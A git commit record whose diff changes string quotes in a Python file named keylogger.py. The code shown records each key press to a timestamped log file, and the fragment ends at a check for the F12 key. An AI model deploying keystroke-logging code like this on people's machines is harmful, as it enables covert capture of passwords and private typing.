9c498091c92b46fbaa070c90098bce4a3f97920a
BurntKevin <51469866+BurntKevin@users.noreply.github.com>
2019-10-08 13:52:24 +1100

    Fixing up inconsistent style
    ' to "

--- keylogger.py
+++ keylogger.py
@@ -12,16 +12,16 @@ date = time.strftime("log-%Y-%m-%d_%H-%M-%S")
 # Given a key, writes it to a file
 def on_key_press(key):
     try:
-        file = open('logs/' + date + ".txt", 'a')
+        file = open("logs/" + date + ".txt", "a")
         file.write(key.char + "\n")
         file.close()
     except AttributeError:
-        file = open('logs/' + date + ".txt", 'a')
-        file.write('{0}\n'.format(key))
+        file = open("logs/" + date + ".txt", "a")
+        file.write("{0}\n".format(key))
         file.close()
     except TypeError:
-        file = open('logs/' + date + ".txt", 'a')
-        file.write('Custom Key: {0}\n'.format(key))
+        file = open("logs/" + date + ".txt", "a")
+        file.write("Custom Key: {0}\n".format(key))
         file.close()
 
     if key == keyboard.Key.f12:
